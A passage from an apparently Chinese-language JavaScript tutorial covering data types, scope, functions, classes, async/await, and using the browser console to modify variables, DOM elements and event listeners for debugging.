class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>undefined</strong>：表示变量已声明但未赋值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> car;<br></code></pre></td></tr></table></figure></li><li><p><strong>Symbol</strong>：表示唯一的标识符（较高级的使用场景）。</p></li></ul><h4 id="对象类型"><a href="#对象类型" class="headerlink" title="对象类型"></a>对象类型</h4><p>对象是属性的集合，用来存储键值对。每个属性有一个名字（键）和一个对应的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><hr><h3 id="变量与作用域"><a href="#变量与作用域" class="headerlink" title="变量与作用域"></a>变量与作用域</h3><h4 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h4><p>在 JavaScript 中，可以使用三种方式声明变量：<code>var</code>、<code>let</code> 和 <code>const</code>。</p><ul><li><p><strong>var</strong>：<code>var</code> 是 JavaScript 中传统的变量声明方式，变量有函数作用域（但没有块作用域），并存在变量提升的问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>let</strong>：<code>let</code> 是 ES6 中引入的，用来声明块作用域变量，能有效避免变量提升和重复声明问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> y = <span class="hljs-number">20</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>const</strong>：<code>const</code> 声明常量，赋值后不能重新赋值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> z = <span class="hljs-number">30</span>;<br></code></pre></td></tr></table></figure></li></ul><h4 id="作用域与闭包"><a href="#作用域与闭包" class="headerlink" title="作用域与闭包"></a>作用域与闭包</h4><ul><li><strong>全局作用域</strong>：在函数外声明的变量具有全局作用域，所有地方都可以访问。</li><li><strong>函数作用域</strong>：在函数内部声明的变量只能在函数内部访问。</li><li><strong>块作用域</strong>：<code>let</code> 和 <code>const</code> 声明的变量具有块作用域，适用于 <code>&#123;&#125;</code> 包围的任意代码块。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-keyword">let</span> message = <span class="hljs-string">&quot;Hello!&quot;</span>;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);  <span class="hljs-comment">// 报错，message 不在作用域内</span><br></code></pre></td></tr></table></figure><hr><h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><p>JavaScript 支持 <code>if...else</code> 和 <code>switch</code> 语句，用于实现条件判断。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> age = <span class="hljs-number">20</span>;<br><br><span class="hljs-keyword">if</span> (age &gt;= <span class="hljs-number">18</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;成年人&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;未成年&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><p>常见的循环结构有 <code>for</code>、<code>while</code> 和 <code>do...while</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h4><p>函数是 JavaScript 的核心概念，函数用于执行特定的任务或计算某些值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>));  <span class="hljs-comment">// 输出 &quot;Hello, Alice&quot;</span><br></code></pre></td></tr></table></figure><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><p>箭头函数是 ES6 中引入的一种更简洁的函数表达方式，尤其适用于回调函数和匿名函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = (<span class="hljs-params">name</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>));<br></code></pre></td></tr></table></figure><p>当函数体只有一个表达式时，<code>return</code> 可以省略：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = name =&gt; <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br></code></pre></td></tr></table></figure><hr><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>JavaScript 是基于事件驱动的语言，可以响应用户的各种交互，如点击、输入等。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;button id=<span class="hljs-string">&quot;myButton&quot;</span>&gt;点击我&lt;/button&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">let</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myButton&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;按钮被点击了！&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h3 id="对象与面向对象编程"><a href="#对象与面向对象编程" class="headerlink" title="对象与面向对象编程"></a>对象与面向对象编程</h3><p>JavaScript 是面向对象的语言，所有东西几乎都是对象。对象是属性和方法的集合。</p><h4 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h4><p>对象可以通过对象字面量、构造函数和 <code>class</code> 关键字创建。</p><ol><li><p><strong>对象字面量</strong>：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, I am &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>构造函数</strong>：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-number">25</span>);<br></code></pre></td></tr></table></figure></li><li><p><strong>Class（类）</strong>：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>    &#125;<br>    <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> person2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>, <span class="hljs-number">35</span>);<br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="异步编程与事件循环的详细审计"><a href="#异步编程与事件循环的详细审计" class="headerlink" title="异步编程与事件循环的详细审计"></a>异步编程与事件循环的详细审计</h4><p>JavaScript 是单线程的，通过异步机制来处理非阻塞任务。异步编程是JavaScript编程中的重要部分。</p><ol><li><p><strong>事件循环的运行机制：</strong></p><ul><li><p><strong>事件循环</strong>负责处理任务队列（如定时器、I&#x2F;O 操作等），JavaScript引擎会持续检查任务队列并执行其中的任务。异步任务（如<code>setTimeout</code>、<code>Promise</code>、<code>async/await</code>）会被放入任务队列，等到主线程空闲时执行。</p><p><strong>代码示例</strong>：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">js复制代码<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Start&quot;</span>);<br>setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Timeout callback&quot;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;End&quot;</span>);<br><span class="hljs-comment">// 输出顺序：Start -&gt; End -&gt; Timeout callback</span><br></code></pre></td></tr></table></figure><p><strong>审计重点：</strong>检查代码中的异步操作是否正确地处理了回调、Promise 的状态转换（resolved&#x2F;rejected），并确保异步操作不会阻塞主线程（如大量 DOM 操作和复杂计算在异步回调中执行）。</p></li></ul></li><li><p><strong><code>Promise</code>与<code>async/await</code>的正确使用：</strong></p><ul><li><p><code>Promise</code> 是处理异步任务的核心对象，通过<code>then</code>链式调用来处理成功和失败的情况。而<code>async/await</code>是<code>Promise</code>的语法糖，便于书写和理解。</p></li><li><p>审查代码中是否使用了适当的错误处理机制，如在<code>await</code>前的异步调用没有使用<code>try-catch</code>捕获异常，可能导致错误不被处理。</p><p><strong>代码示例</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">js复制代码<span class="hljs-comment">// 不推荐：没有处理 Promise 的异常情况</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;<br><br><span class="hljs-comment">// 推荐：使用 try-catch 捕获异常</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchDataWithHandling</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch error: &#x27;</span>, error);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>审计重点：</strong>检查异步操作是否妥善处理了异常情况，避免应用程序在发生错误时崩溃。</p></li></ul></li></ol><h3 id="修改变量和函数"><a href="#修改变量和函数" class="headerlink" title="修改变量和函数"></a>修改变量和函数</h3><h4 id="1-1-修改变量的值"><a href="#1-1-修改变量的值" class="headerlink" title="1.1 修改变量的值"></a>1.1 修改变量的值</h4><p>在控制台中，你可以直接修改已经声明的全局变量或局部变量的值。这种操作会立即生效，但仅限当前会话，刷新页面后会恢复初始状态。</p><p><strong>步骤：</strong></p><ol><li>打开控制台（按 <code>F12</code> 或 <code>Ctrl + Shift + I</code>）。</li><li>在控制台中找到你想修改的变量，直接输入代码修改它的值。</li></ol><p><strong>示例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">html复制代码<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> message = <span class="hljs-string">&quot;Hello, World!&quot;</span>;</span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);  <span class="hljs-comment">// 输出 &quot;Hello, World!&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在控制台中输入以下代码来修改变量值：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas">javascript复制代码<span class="hljs-keyword">message</span> = <span class="hljs-string">&quot;Hello, Console!&quot;</span>;<br>console.<span class="hljs-meta">log</span>(<span class="hljs-keyword">message</span>);  // 输出 <span class="hljs-string">&quot;Hello, Console!&quot;</span><br></code></pre></td></tr></table></figure><h4 id="1-2-修改函数的行为"><a href="#1-2-修改函数的行为" class="headerlink" title="1.2 修改函数的行为"></a>1.2 修改函数的行为</h4><p>你可以重定义页面中的现有函数，从而修改其行为。控制台中的函数修改也只会在当前页面有效，刷新后恢复原始状态。</p><p><strong>步骤：</strong></p><ol><li>打开控制台。</li><li>通过重写函数来改变其行为。</li></ol><p><strong>示例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">html复制代码<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello from original function!&quot;</span>);</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">  <span class="hljs-title function_">greet</span>();  <span class="hljs-comment">// 输出 &quot;Hello from original function!&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>现在在控制台中输入以下代码重定义函数：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">javascript复制代码greet = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Hello from modified function!&quot;</span>);<br>&#125;;<br>greet();  <span class="hljs-comment">// 输出 &quot;Hello from modified function!&quot;</span><br></code></pre></td></tr></table></figure><h3 id="二、修改-DOM-元素"><a href="#二、修改-DOM-元素" class="headerlink" title="二、修改 DOM 元素"></a>二、修改 DOM 元素</h3><p>控制台允许你动态操作页面的 DOM 元素，修改元素的内容、属性和样式。这是前端开发和调试中非常常用的功能。</p><h4 id="2-1-修改元素的内容"><a href="#2-1-修改元素的内容" class="headerlink" title="2.1 修改元素的内容"></a>2.1 修改元素的内容</h4><p>你可以选择页面上的任何 DOM 元素，并通过控制台修改它的内容。</p><p><strong>步骤：</strong></p><ol><li>在控制台中输入 <code>document.querySelector</code> 来选择页面元素。</li><li>使用 <code>.textContent</code> 或 <code>.innerHTML</code> 来修改元素的内容。</li></ol><p><strong>示例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">html<br>复制代码<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;heading&quot;</span>&gt;</span>Original Heading<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在控制台中输入以下代码来修改标题内容：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascript<br>复制代码<br><span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#heading&#x27;</span>).textContent = <span class="hljs-string">&#x27;Modified Heading&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-2-修改元素的样式"><a href="#2-2-修改元素的样式" class="headerlink" title="2.2 修改元素的样式"></a>2.2 修改元素的样式</h4><p>你也可以直接通过控制台修改 HTML 元素的样式，来测试视觉效果。</p><p><strong>步骤：</strong></p><ol><li>通过控制台选择页面元素。</li><li>使用 <code>.style</code> 来修改元素的内联样式。</li></ol><p><strong>示例：</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">html<br>复制代码<br>&lt;p <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;paragraph&quot;</span>&gt;This <span class="hljs-keyword">is</span> a <span class="hljs-built_in">paragraph</span>.&lt;/p&gt;<br></code></pre></td></tr></table></figure><p>在控制台中输入以下代码来修改段落的颜色和字体大小：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascript复制代码let paragraph = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#paragraph&#x27;</span>);<br>paragraph.style.color = <span class="hljs-string">&#x27;red&#x27;</span>;<br>paragraph.style.fontSize = <span class="hljs-string">&#x27;24px&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-3-添加和删除-DOM-元素"><a href="#2-3-添加和删除-DOM-元素" class="headerlink" title="2.3 添加和删除 DOM 元素"></a>2.3 添加和删除 DOM 元素</h4><p>除了修改已有的 DOM 元素外，你还可以通过控制台添加或删除元素。</p><p><strong>步骤：</strong></p><ol><li>使用 <code>document.createElement</code> 创建新元素。</li><li>使用 <code>appendChild</code> 或 <code>removeChild</code> 来添加或删除元素。</li></ol><p><strong>示例：</strong> 在控制台中添加一个新的 <code>div</code> 元素到页面：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">javascript复制代码let newDiv = document.createElement(<span class="hljs-symbol">&#x27;div</span>&#x27;);<br>newDiv.textContent = <span class="hljs-symbol">&#x27;This</span> <span class="hljs-keyword">is</span> a <span class="hljs-keyword">new</span> div!&#x27;;<br>document.<span class="hljs-keyword">body</span>.appendChild(newDiv);<br></code></pre></td></tr></table></figure><p>要删除该元素：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">javascript<br>复制代码<br>document.body.removeChild(newDiv)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="三、调试-JavaScript-代码"><a href="#三、调试-JavaScript-代码" class="headerlink" title="三、调试 JavaScript 代码"></a>三、调试 JavaScript 代码</h3><p>控制台不仅可以修改代码，还可以帮助你调试页面中的 JavaScript。常用的方法包括：</p><ol><li><strong>插入断点：</strong>你可以在代码执行的特定位置插入断点，并通过控制台监控变量的值和代码的执行流程。</li><li><strong>使用 <code>console.log</code> 追踪变量：</strong>通过在控制台中输出变量值，来追踪代码的执行和状态。</li></ol><h4 id="3-1-插入-console-log-进行调试"><a href="#3-1-插入-console-log-进行调试" class="headerlink" title="3.1 插入 console.log 进行调试"></a>3.1 插入 <code>console.log</code> 进行调试</h4><p>在控制台中你可以插入调试代码，比如<code>console.log</code>，来查看函数中的变量或输出信息，调试过程中常用。</p><p><strong>步骤：</strong></p><ol><li>在控制台中运行代码，监控某些关键变量。</li><li>使用 <code>console.log()</code> 输出信息。</li></ol><p><strong>示例：</strong></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xquery">html复制代码<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateSum</span>(<span class="hljs-params">a, b</span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">    <span class="hljs-keyword">let</span><span class="hljs-built_in"> sum</span> = a + b;</span><br><span class="language-xquery">    <span class="hljs-keyword">return</span><span class="hljs-built_in"> sum</span>;</span><br><span class="language-xquery">  &#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>在控制台中修改代码并添加调试信息：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">javascript复制代码<span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateSum</span>(<span class="hljs-params">a, b</span>) &#123;<br>  let <span class="hljs-built_in">sum</span> = a + b;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;The sum is:&#x27;</span>, <span class="hljs-built_in">sum</span>);  <span class="hljs-comment">// 输出 sum 值</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>;<br>&#125;<br>calculateSum(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>);  <span class="hljs-comment">// 控制台中输出 &quot;The sum is: 15&quot;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-插入断点调试"><a href="#3-2-插入断点调试" class="headerlink" title="3.2 插入断点调试"></a>3.2 插入断点调试</h4><p>通过 Chrome DevTools，你可以在 <code>Sources</code> 面板中为 JavaScript 文件设置断点，并通过控制台查看变量的状态，调试流程如下：</p><ol><li>打开 DevTools，点击 <code>Sources</code> 面板。</li><li>打开包含 JavaScript 代码的文件。</li><li>点击行号设置断点。</li><li>刷新页面或触发代码执行，程序将在断点处暂停，此时可以在控制台中检查变量值。</li></ol><h3 id="四、临时注入新代码"><a href="#四、临时注入新代码" class="headerlink" title="四、临时注入新代码"></a>四、临时注入新代码</h3><p>你可以在控制台中临时注入新代码，比如为按钮添加新的点击事件，修改页面的交互逻辑。</p><h4 id="4-1-添加事件监听器"><a href="#4-1-添加事件监听器" class="headerlink" title="4.1 添加事件监听器"></a>4.1 添加事件监听器</h4><p><strong>步骤：</strong></p><ol><li>使用 <code>addEventListener</code> 为页面中的元素添加事件。</li><li>在控制台中注入该代码，点击按钮时会执行新添加的事件处理程序。</li></ol><p><strong>示例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">html<br>复制代码<br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myButton&quot;</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在控制台中为按钮添加点击事件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#myButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Button clicked!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>点击按钮时，将弹出一个提示框。</p><h3 